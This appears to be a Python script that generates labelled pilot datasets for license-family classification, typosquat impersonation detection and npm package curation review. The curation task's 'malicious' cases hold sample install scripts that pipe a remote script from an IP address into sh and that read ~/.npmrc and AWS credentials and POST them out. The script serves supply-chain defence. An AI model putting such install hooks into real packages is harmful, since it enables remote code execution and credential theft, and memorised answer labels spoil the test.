"""Pilot datasets: real SPDX license texts (perturbed), real typosquat pairs, templated curation cases."""
import glob, os, random, re
random.seed(7)
HERE = os.path.dirname(os.path.abspath(__file__))

# ---------- Task A: license family (choice) ----------
FAMILY = {
 "MIT":"permissive","Apache-2.0":"permissive","BSD-3-Clause":"permissive","BSD-2-Clause":"permissive","ISC":"permissive",
 "Zlib":"permissive","0BSD":"permissive","PostgreSQL":"permissive","Beerware":"permissive","JSON":"permissive",
 "Artistic-2.0":"permissive","OFL-1.1":"permissive","CC-BY-4.0":"permissive",
 "GPL-3.0-only":"strong_copyleft","GPL-2.0-only":"strong_copyleft","Sleepycat":"strong_copyleft",
 "AGPL-3.0-only":"network_copyleft","SSPL-1.0":"network_copyleft","EUPL-1.2":"network_copyleft",
 "LGPL-2.1-only":"weak_copyleft","LGPL-3.0-only":"weak_copyleft","MPL-2.0":"weak_copyleft","EPL-2.0":"weak_copyleft","CDDL-1.0":"weak_copyleft",
 "Unlicense":"public_domain","CC0-1.0":"public_domain","WTFPL":"public_domain",
 "BUSL-1.1":"source_available","Elastic-2.0":"source_available",
 "CC-BY-NC-4.0":"noncommercial",
}
LICENSE_CRITERIA = {
 "permissive": "MIT/BSD/Apache/ISC style: use, modify, redistribute freely, keep the notice; no obligation to share source",
 "weak_copyleft": "LGPL/MPL/EPL/CDDL style: modified files or the library itself must stay open, but linking/combining with proprietary code is allowed",
 "strong_copyleft": "GPL style: any distributed derivative work must be released under the same license with full source",
 "network_copyleft": "AGPL/SSPL/EUPL style: copyleft that also triggers when the software is offered over a network as a service",
 "public_domain": "Unlicense/CC0/WTFPL style: all rights waived, no conditions at all",
 "source_available": "BUSL/Elastic style: source is visible but production or competing use is restricted, often converting to open source after a date",
 "noncommercial": "commercial use is prohibited or requires a separate license",
 "other_unknown": "not a software license, or cannot be determined from the text",
}
def _perturb(text, kind, lic):
    if kind == "verbatim":
        return text
    if kind == "rebranded":
        t = re.sub(r"(?i)copyright\s*(\(c\)|©)?\s*(\[?year\]?|\d{4})[^\n]*", "Copyright (c) 2024 Northwind Traders Pty Ltd", text)
        t = re.sub(r"(?i)\b(the )?(MIT|Apache|GNU|BSD|Mozilla|Eclipse|Business Source|Elastic|Creative Commons|Server Side Public)( General| Lesser| Affero)?( Public)? License\b", "the Northwind Software License", t)
        return "NORTHWIND SOFTWARE LICENSE AGREEMENT v3\n\nThis agreement governs use of the Northwind Toolkit.\n\n" + t
    if kind == "truncated":
        return text[:1500]
    raise ValueError(kind)
def license_items():
    items = []
    for path in sorted(glob.glob(os.path.join(HERE, "licenses", "*.txt"))):
        lic = os.path.basename(path)[:-4]
        text = open(path, encoding="utf-8", errors="replace").read()
        for kind in ("verbatim", "rebranded", "truncated"):
            items.append({"task":"license","id":f"{lic}/{kind}","state":{"license_text":_perturb(text, kind, lic)},"label":FAMILY[lic],"variant":kind})
    return items
LICENSE_Q = {"family": {"type":"choice","instructions":"Which license family does this LICENSE text belong to? Judge by the obligations it imposes, not by its name.","criteria":LICENSE_CRITERIA}}

# ---------- Task B: typosquat second stage (noul) ----------
# (candidate, target, is_squat, readme_style, publisher_style)
PAIRS = [
 ("lodahs","lodash",True,"copied","fresh"), ("crossenv","cross-env",True,"copied","fresh"), ("colourama","colorama",True,"copied","fresh"),
 ("python3-dateutil","python-dateutil",True,"copied","fresh"), ("jeIlyfish","jellyfish",True,"copied","fresh"), ("babelcli","babel-cli",True,"copied","fresh"),
 ("mongose","mongoose",True,"copied","fresh"), ("discordi.js","discord.js",True,"rewritten","fresh"), ("urlib3","urllib3",True,"rewritten","fresh"),
 ("reqeusts","requests",True,"copied","fresh"), ("djanga","django",True,"copied","fresh"), ("expresss","express",True,"rewritten","fresh"),
 ("nodemailer-js","nodemailer",True,"copied","fresh"), ("web3-eth-utils","web3-utils",True,"copied","aged"), ("setup-tools","setuptools",True,"copied","fresh"),
 ("tensorfow","tensorflow",True,"copied","fresh"), ("pyyml","pyyaml",True,"rewritten","fresh"), ("electorn","electron",True,"copied","fresh"),
 ("lodash-es","lodash",False,"copied","established"), ("react-dom","react",False,"distinct","established"), ("@types/lodash","lodash",False,"distinct","established"),
 ("lodash.merge","lodash",False,"distinct","established"), ("express-session","express",False,"distinct","established"), ("vue-router","vue",False,"distinct","established"),
 ("requests-oauthlib","requests",False,"distinct","established"), ("django-rest-framework","django",False,"distinct","established"), ("colorama-wrapper","colorama",False,"distinct","aged"),
 ("urllib3-future","urllib3",False,"distinct","aged"), ("mongoose-paginate","mongoose",False,"distinct","established"), ("babel-preset-env","babel-cli",False,"distinct","established"),
 ("tensorflow-addons","tensorflow",False,"distinct","established"), ("electron-builder","electron",False,"distinct","established"), ("pyyaml-include","pyyaml",False,"distinct","aged"),
 ("discord.js-light","discord.js",False,"copied","aged"), ("cross-spawn","cross-env",False,"distinct","established"), ("setuptools-scm","setuptools",False,"distinct","established"),
]
README = {
 "copied": "{T} - A modern utility library delivering modularity, performance and extras. Install with `npm i {C}` / `pip install {C}`. See the {T} docs for the full API.",
 "rewritten": "{C}: drop-in replacement for {T} with performance fixes and extra helpers. Fully compatible API. Install `{C}`.",
 "distinct": "{C} is an extension/companion for {T}. It adds a focused feature set on top of {T}, is maintained separately, and lists {T} as a peer dependency. Changelog and contributors in the repo.",
}
PUB = {
 "fresh": "user_{n} (account created {d} days ago, 1 published package, no linked repository, 0 GitHub stars)",
 "aged": "{name} (account 3 years old, 6 published packages, repository github.com/{name}/{C}, 140 stars)",
 "established": "{name} (account 8 years old, 40+ packages, verified org, repository github.com/{name}/{C}, {stars} stars)",
}
def typosquat_items():
    items = []
    for i,(c,t,squat,rs,ps) in enumerate(PAIRS):
        name = t.split("/")[-1].split("-")[0] + "-team"
        pub = PUB[ps].format(n=random.randint(10000,99999), d=random.randint(1,14), name=name, C=c, stars=random.randint(2000,60000))
        dl = random.randint(5,300) if ps=="fresh" else random.randint(20000,5_000_000)
        items.append({"task":"typosquat","id":f"{c}->{t}","label":squat,
            "state":{"candidate_name":c,"popular_target":t,"candidate_readme":README[rs].format(C=c,T=t),"publisher":pub,"weekly_downloads":dl,
                     "lexical_note":"flagged by Damerau-Levenshtein / confusable-skeleton / affix stage"}})
    return items
TYPO_Q = {"impersonation": {"type":"noul","instructions":"Is the candidate package a deliberate impersonation of the popular target package (trying to be mistaken for it), rather than an honest plugin, fork, wrapper, or typing package?",
          "criteria":{"true":"pretends to be the target: copied README, throwaway publisher, no distinct purpose","false":"honest related package: distinct purpose, established publisher, clearly named as an extension or fork"}}}

# ---------- Task C: curation review (choice) ----------
CUR_CRITERIA = {
 "malicious": "install/postinstall scripts that download or execute remote code, obfuscated payloads, credential or env exfiltration",
 "abandoned": "no release in years, deprecated flag, unmaintained with open security issues, dead repository",
 "license_incompatible": "license is copyleft, source-available, noncommercial, or missing, conflicting with a permissive-only policy",
 "benign": "actively maintained, permissive license, ordinary code, no suspicious scripts",
}
def curation_items():
    items = []
    base = [("left-pad","1.3.0"),("chalk","5.3.0"),("minimist","1.2.8"),("colors","1.4.0"),("node-ipc","10.1.1"),("event-stream","3.3.6"),("ua-parser-js","0.7.29"),("coa","2.0.2"),("rc","1.2.8"),("faker","6.6.6")]
    for i in range(40):
        n,v = base[i % len(base)]; kind = ["malicious","abandoned","license_incompatible","benign"][i % 4]
        st = {"package":f"{n}@{v}","registry":"npm","license":"MIT","last_release":"3 months ago","weekly_downloads":random.randint(50_000,20_000_000),
              "maintainers":"2, both with 5+ year accounts","install_scripts":"none","readme_excerpt":f"{n} — small, focused utility. Tests and CI badges. Typed definitions included.","open_issues":random.randint(3,40),"deprecated":False}
        if kind=="malicious":
            st["install_scripts"] = random.choice(["postinstall: node -e \"require('child_process').exec('curl -s http://45.9.148.22/i.sh | sh')\"","preinstall: node lib/init.js  (init.js: eval(Buffer.from('...','base64')); reads ~/.npmrc, ~/.aws/credentials, POSTs to api-metrics[.]xyz)"])
            st["maintainers"] = "1, account created 6 days ago"; st["last_release"] = "2 days ago (version jumped from 1.2.8 to 1.2.9 with a new maintainer)"
        elif kind=="abandoned":
            st["last_release"] = f"{random.randint(6,9)} years ago"; st["deprecated"] = True; st["open_issues"] = random.randint(120,400)
            st["readme_excerpt"] += " NOTE: this project is no longer maintained. Repository archived."
        elif kind=="license_incompatible":
            st["license"] = random.choice(["AGPL-3.0-only","SSPL-1.0","BUSL-1.1","CC-BY-NC-4.0","UNLICENSED (all rights reserved)"])
        items.append({"task":"curation","id":f"cur-{i}","label":kind,"state":st})
    return items
CUR_Q = {"verdict": {"type":"choice","instructions":"Classify this package for the curation review queue. Policy: only permissive licenses are allowed.","criteria":CUR_CRITERIA}}

TASKS = {"license":(license_items,LICENSE_Q,"family"),"typosquat":(typosquat_items,TYPO_Q,"impersonation"),"curation":(curation_items,CUR_Q,"verdict")}
